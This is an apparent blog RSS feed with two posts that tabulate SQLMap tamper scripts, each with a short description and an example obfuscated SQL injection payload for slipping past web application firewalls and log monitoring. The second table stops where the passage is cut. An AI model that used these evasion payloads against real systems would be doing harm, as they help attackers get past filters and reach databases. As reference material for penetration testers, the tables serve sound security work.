<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on #forkbombers</title>
    <link>http://www.forkbombers.com/post.html</link>
    <description>Recent content in Posts on #forkbombers</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 04 Jul 2016 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://www.forkbombers.com/post.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SQLMap Tamper Scripts Update</title>
      <link>http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html</link>
      <pubDate>Mon, 04 Jul 2016 00:00:00 +0000</pubDate>
      
      <guid>http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html</guid>
      <description>&lt;p&gt;So my last post from three years ago was pretty well received, with the rate at which SQLMap is developed it is definitely behind.r,&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s an updated graph of all tamper scripts included with the latest version (as of time of writing, 04/July/2016).&lt;/p&gt;

&lt;p&gt;I will be putting something together, possibly as a commit to the SQLMap project to aid with these. Will update once done so stay tuned.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Name&lt;/td&gt;
&lt;td&gt;Description&lt;/td&gt;
&lt;td&gt;Example&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;apostrophemask.py&lt;/td&gt;
&lt;td&gt;Replaces apostrophe character with its UTF-8 full width counterpart&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;apostrophenullencode.py&lt;/td&gt;
&lt;td&gt;Replaces apostrophe character with its illegal double unicode counterpart&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND %271%27=%271&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;appendnullbyte.py&lt;/td&gt;
&lt;td&gt;Appends encoded NULL byte character at the end of payload&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND 1=1&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;base64encode.py&lt;/td&gt;
&lt;td&gt;Base64 all characters in a given payload&lt;/td&gt;
&lt;td&gt;&amp;lsquo;MScgQU5EIFNMRUVQKDUpIw==&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;between.py&lt;/td&gt;
&lt;td&gt;Replaces greater than operator (&amp;lsquo;&amp;gt;&amp;rsquo;) with &amp;lsquo;NOT BETWEEN 0 AND #&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND A NOT BETWEEN 0 AND B&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;bluecoat.py&lt;/td&gt;
&lt;td&gt;Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%09id FROM users where id LIKE 1&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;chardoubleencode.py&lt;/td&gt;
&lt;td&gt;Double url-encodes all characters in a given payload (not processing already encoded)&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;commalesslimit.py&lt;/td&gt;
&lt;td&gt;Replaces instances like &amp;lsquo;LIMIT M, N&amp;rsquo; with &amp;lsquo;LIMIT N OFFSET M&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;ldquo;LIMIT 3 OFFSET 2&amp;rdquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;commalessmid.py&lt;/td&gt;
&lt;td&gt;Replaces instances like &amp;lsquo;MID(A, B, C)&amp;rsquo; with &amp;lsquo;MID(A FROM B FOR C)&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;MID(VERSION() FROM 1 FOR 1)&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;concat2concatws.py&lt;/td&gt;
&lt;td&gt;Replaces instances like &amp;lsquo;CONCAT(A, B)&amp;rsquo; with &amp;lsquo;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;CONCAT_WS(MID(CHAR(0),0,0),1,2)&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;charencode.py&lt;/td&gt;
&lt;td&gt;Url-encodes all characters in a given payload (not processing already encoded)&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;charunicodeencode.py&lt;/td&gt;
&lt;td&gt;Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;equaltolike.py&lt;/td&gt;
&lt;td&gt;Replaces all occurances of operator equal (&amp;lsquo;=&amp;rsquo;) with operator &amp;lsquo;LIKE&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT * FROM users WHERE id LIKE 1&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;escapequotes.py&lt;/td&gt;
&lt;td&gt;Slash escape quotes (&amp;rsquo; and &amp;ldquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1\\&amp;rdquo; AND SLEEP(5)#&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;greatest.py&lt;/td&gt;
&lt;td&gt;Replaces greater than operator (&amp;lsquo;&amp;gt;&amp;rsquo;) with &amp;lsquo;GREATEST&amp;rsquo; counterpart&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND GREATEST(A,B+1)=A&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;halfversionedmorekeywords.py&lt;/td&gt;
&lt;td&gt;Adds versioned MySQL comment before each keyword&lt;/td&gt;
&lt;td&gt;&amp;ldquo;value&amp;rsquo;/&lt;em&gt;!0UNION/&lt;/em&gt;!0ALL/&lt;em&gt;!0SELECT/&lt;/em&gt;!0CONCAT(/&lt;em&gt;!0CHAR(58,107,112,113,58),/&lt;/em&gt;!0IFNULL(CAST(/&lt;em&gt;!0CURRENT_USER()/&lt;/em&gt;!0AS/&lt;em&gt;!0CHAR),/&lt;/em&gt;!0CHAR(32)),/&lt;em&gt;!0CHAR(58,97,110,121,58)),/&lt;/em&gt;!0NULL,/&lt;em&gt;!0NULL#/&lt;/em&gt;!0AND &amp;lsquo;QDWa&amp;rsquo;=&amp;lsquo;QDWa&amp;rdquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;ifnull2ifisnull.py&lt;/td&gt;
&lt;td&gt;Replaces instances like &amp;lsquo;IFNULL(A, B)&amp;rsquo; with &amp;lsquo;IF(ISNULL(A), B, A)&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;IF(ISNULL(1),2,1)&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;modsecurityversioned.py&lt;/td&gt;
&lt;td&gt;Embraces complete query with versioned comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 /&lt;em&gt;!30874AND 2&amp;gt;1&lt;/em&gt;/&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;modsecurityzeroversioned.py&lt;/td&gt;
&lt;td&gt;Embraces complete query with zero-versioned comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 /&lt;em&gt;!00000AND 2&amp;gt;1&lt;/em&gt;/&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;multiplespaces.py&lt;/td&gt;
&lt;td&gt;Adds multiple spaces around SQL keywords&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 UNION SELECT foobar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;nonrecursivereplacement.py&lt;/td&gt;
&lt;td&gt;Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&amp;ldquo;SELECT&amp;rdquo;, &amp;ldquo;&amp;rdquo;)) filters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 UNIOUNIONN SELESELECTCT 2&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;percentage.py&lt;/td&gt;
&lt;td&gt;Adds a percentage sign (&amp;lsquo;%&amp;rsquo;) infront of each character&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;overlongutf8.py&lt;/td&gt;
&lt;td&gt;Converts all characters in a given payload (not processing already encoded)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;randomcase.py&lt;/td&gt;
&lt;td&gt;Replaces each keyword character with random case value&lt;/td&gt;
&lt;td&gt;&amp;lsquo;INseRt&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;randomcomments.py&lt;/td&gt;
&lt;td&gt;Add random comments to SQL keywords&lt;/td&gt;
&lt;td&gt;&amp;lsquo;I/&lt;strong&gt;/N/&lt;/strong&gt;/SERT&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;securesphere.py&lt;/td&gt;
&lt;td&gt;Appends special crafted string&lt;/td&gt;
&lt;td&gt;&amp;ldquo;1 AND 1=1 and &amp;lsquo;0having&amp;rsquo;=&amp;lsquo;0having&amp;rsquo;&amp;rdquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;sp_password.py&lt;/td&gt;
&lt;td&gt;Appends &amp;lsquo;sp_password&amp;rsquo; to the end of the payload for automatic obfuscation from DBMS logs&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND 9227=9227&amp;ndash; sp_password&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2comment.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with comments &amp;lsquo;/**/&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT/&lt;strong&gt;/id/&lt;/strong&gt;/FROM/**/users&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2dash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a dash comment (&amp;rsquo;&amp;ndash;&amp;lsquo;) followed by a random string and a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1&amp;ndash;nVNaVoPYeva%0AAND&amp;ndash;ngNvzqu%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2hash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a pound character (&amp;rsquo;#&amp;lsquo;) followed by a random string and a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2morehash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a pound character (&amp;rsquo;#&amp;lsquo;) followed by a random string and a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mssqlblank.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a random blank character from a valid set of alternate characters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%0Eid%0DFROM%07users&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mssqlhash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a pound character (&amp;rsquo;#&amp;lsquo;) followed by a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%23%0AAND%23%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mysqlblank.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a random blank character from a valid set of alternate characters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%A0id%0BFROM%0Cusers&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mysqldash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a dash comment (&amp;rsquo;&amp;ndash;&amp;lsquo;) followed by a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1&amp;ndash;%0AAND&amp;ndash;%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2plus.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with plus (&amp;rsquo;+&amp;lsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT+id+FROM+users&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2randomblank.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a random blank character from a valid set of alternate characters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%0Did%0DFROM%0Ausers&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;symboliclogical.py&lt;/td&gt;
&lt;td&gt;Replaces AND and OR logical operators with their symbolic counterparts (&amp;amp;&amp;amp; and&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;unionalltounion.py&lt;/td&gt;
&lt;td&gt;Replaces UNION ALL SELECT with UNION SELECT&lt;/td&gt;
&lt;td&gt;&amp;rsquo;-1 UNION SELECT&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;unmagicquotes.py&lt;/td&gt;
&lt;td&gt;Replaces quote character (&amp;lsquo;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%bf%27 AND 1=1&amp;ndash; &amp;lsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;uppercase.py&lt;/td&gt;
&lt;td&gt;Replaces each keyword character with upper case value&lt;/td&gt;
&lt;td&gt;&amp;lsquo;INSERT&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;varnish.py&lt;/td&gt;
&lt;td&gt;Append a HTTP header &amp;lsquo;X-originating-IP&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366&#34;&gt;http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;versionedkeywords.py&lt;/td&gt;
&lt;td&gt;Encloses each non-function keyword with versioned MySQL comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1/&lt;em&gt;!UNION&lt;/em&gt;//&lt;em&gt;!ALL&lt;/em&gt;//&lt;em&gt;!SELECT&lt;/em&gt;//&lt;em&gt;!NULL&lt;/em&gt;/,/&lt;em&gt;!NULL&lt;/em&gt;/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/&lt;em&gt;!AS&lt;/em&gt;//&lt;em&gt;!CHAR&lt;/em&gt;/),CHAR(32)),CHAR(58,100,114,117,58))#&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;versionedmorekeywords.py&lt;/td&gt;
&lt;td&gt;Encloses each keyword with versioned MySQL comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1/&lt;em&gt;!UNION&lt;/em&gt;//&lt;em&gt;!ALL&lt;/em&gt;//&lt;em&gt;!SELECT&lt;/em&gt;//&lt;em&gt;!NULL&lt;/em&gt;/,/&lt;em&gt;!NULL&lt;/em&gt;/,/&lt;em&gt;!CONCAT&lt;/em&gt;/(/&lt;em&gt;!CHAR&lt;/em&gt;/(58,122,114,115,58),/&lt;em&gt;!IFNULL&lt;/em&gt;/(CAST(/&lt;em&gt;!CURRENT_USER&lt;/em&gt;/()/&lt;em&gt;!AS&lt;/em&gt;//&lt;em&gt;!CHAR&lt;/em&gt;/),/&lt;em&gt;!CHAR&lt;/em&gt;/(32)),/&lt;em&gt;!CHAR&lt;/em&gt;/(58,115,114,121,58))#&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;xforwardedfor.py&lt;/td&gt;
&lt;td&gt;Append a fake HTTP header &amp;lsquo;X-Forwarded-For&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;rsquo; headers[&amp;ldquo;X-Forwarded-For&amp;rdquo;]&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</description>
    </item>
    
    <item>
      <title>SQLMap&#39;s Tamper Scripts</title>
      <link>http://www.forkbombers.com/2015/05/sqlmap-tamper-scripts.html</link>
      <pubDate>Fri, 15 May 2015 00:00:00 +0000</pubDate>
      
      <guid>http://www.forkbombers.com/2015/05/sqlmap-tamper-scripts.html</guid>
      <description>&lt;p&gt;THIS POST IS OUTDATED, PLEASE SEE LATEST VERSION &lt;a href=&#34;http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html&#34;&gt;HERE&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve been playing with SQLMap a lot recently to automate all sorts of injections, something which isn&amp;rsquo;t so well documented is the tamper scripts which come with it.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s a graph with short explanations of what each does, maybe someone will find it useful.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Name&lt;/td&gt;
&lt;td&gt;Description&lt;/td&gt;
&lt;td&gt;Example&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;apostrophemask.py&lt;/td&gt;
&lt;td&gt;Replaces apostrophe character with its UTF-8 full width counterpart&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;apostrophenullencode.py&lt;/td&gt;
&lt;td&gt;Replaces apostrophe character with its illegal double unicode counterpart&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND %271%27=%271&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;appendnullbyte.py&lt;/td&gt;
&lt;td&gt;Appends encoded NULL byte character at the end of payload&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND 1=1&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;base64encode.py&lt;/td&gt;
&lt;td&gt;Base64 all characters in a given payload&lt;/td&gt;
&lt;td&gt;&amp;lsquo;MScgQU5EIFNMRUVQKDUpIw==&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;between.py&lt;/td&gt;
&lt;td&gt;Replaces greater than operator (&amp;lsquo;&amp;gt;&amp;rsquo;) with &amp;lsquo;NOT BETWEEN 0 AND #&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND A NOT BETWEEN 0 AND B&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;bluecoat.py&lt;/td&gt;
&lt;td&gt;Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%09id FROM users where id LIKE 1&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;chardoubleencode.py&lt;/td&gt;
&lt;td&gt;Double url-encodes all characters in a given payload (not processing already encoded)&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;charencode.py&lt;/td&gt;
&lt;td&gt;Url-encodes all characters in a given payload (not processing already encoded)&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;charunicodeencode.py&lt;/td&gt;
&lt;td&gt;Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;equaltolike.py&lt;/td&gt;
&lt;td&gt;Replaces all occurances of operator equal (&amp;lsquo;=&amp;rsquo;) with operator &amp;lsquo;LIKE&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT * FROM users WHERE id LIKE 1&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;greatest.py&lt;/td&gt;
&lt;td&gt;Replaces greater than operator (&amp;lsquo;&amp;gt;&amp;rsquo;) with &amp;lsquo;GREATEST&amp;rsquo; counterpart&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND GREATEST(A,B+1)=A&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;halfversionedmorekeywords.py&lt;/td&gt;
&lt;td&gt;Adds versioned MySQL comment before each keyword&lt;/td&gt;
&lt;td&gt;&amp;ldquo;value&amp;rsquo;/&lt;em&gt;!0UNION/&lt;/em&gt;!0ALL/&lt;em&gt;!0SELECT/&lt;/em&gt;!0CONCAT(/&lt;em&gt;!0CHAR(58,107,112,113,58),/&lt;/em&gt;!0IFNULL(CAST(/&lt;em&gt;!0CURRENT_USER()/&lt;/em&gt;!0AS/&lt;em&gt;!0CHAR),/&lt;/em&gt;!0CHAR(32)),/&lt;em&gt;!0CHAR(58,97,110,121,58)),/&lt;/em&gt;!0NULL,/&lt;em&gt;!0NULL#/&lt;/em&gt;!0AND &amp;lsquo;QDWa&amp;rsquo;=&amp;lsquo;QDWa&amp;rdquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;ifnull2ifisnull.py&lt;/td&gt;
&lt;td&gt;Replaces instances like &amp;lsquo;IFNULL(A, B)&amp;rsquo; with &amp;lsquo;IF(ISNULL(A), B, A)&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;IF(ISNULL(1),2,1)&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;modsecurityversioned.py&lt;/td&gt;
&lt;td&gt;Embraces complete query with versioned comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 /&lt;em&gt;!30874AND 2&amp;gt;1&lt;/em&gt;/&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;modsecurityzeroversioned.py&lt;/td&gt;
&lt;td&gt;Embraces complete query with zero-versioned comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 /&lt;em&gt;!00000AND 2&amp;gt;1&lt;/em&gt;/&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;multiplespaces.py&lt;/td&gt;
&lt;td&gt;Adds multiple spaces around SQL keywords&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 UNION SELECT foobar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;nonrecursivereplacement.py&lt;/td&gt;
&lt;td&gt;Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&amp;ldquo;SELECT&amp;rdquo;, &amp;ldquo;&amp;rdquo;)) filters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 UNIOUNIONN SELESELECTCT 2&amp;ndash;&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;percentage.py&lt;/td&gt;
&lt;td&gt;Adds a percentage sign (&amp;lsquo;%&amp;rsquo;) infront of each character&lt;/td&gt;
&lt;td&gt;&amp;rsquo;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;randomcase.py&lt;/td&gt;
&lt;td&gt;Replaces each keyword character with random case value&lt;/td&gt;
&lt;td&gt;&amp;lsquo;INseRt&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;randomcomments.py&lt;/td&gt;
&lt;td&gt;Add random comments to SQL keywords&lt;/td&gt;
&lt;td&gt;&amp;lsquo;I/&lt;strong&gt;/N/&lt;/strong&gt;/SERT&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;securesphere.py&lt;/td&gt;
&lt;td&gt;Appends special crafted string&lt;/td&gt;
&lt;td&gt;&amp;ldquo;1 AND 1=1 and &amp;lsquo;0having&amp;rsquo;=&amp;lsquo;0having&amp;rsquo;&amp;rdquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;sp_password.py&lt;/td&gt;
&lt;td&gt;Appends &amp;lsquo;sp_password&amp;rsquo; to the end of the payload for automatic obfuscation from DBMS logs&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1 AND 9227=9227&amp;ndash; sp_password&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2comment.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with comments &amp;lsquo;/**/&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT/&lt;strong&gt;/id/&lt;/strong&gt;/FROM/**/users&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2dash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a dash comment (&amp;rsquo;&amp;ndash;&amp;lsquo;) followed by a random string and a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1&amp;ndash;nVNaVoPYeva%0AAND&amp;ndash;ngNvzqu%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2hash.py&lt;/td&gt;
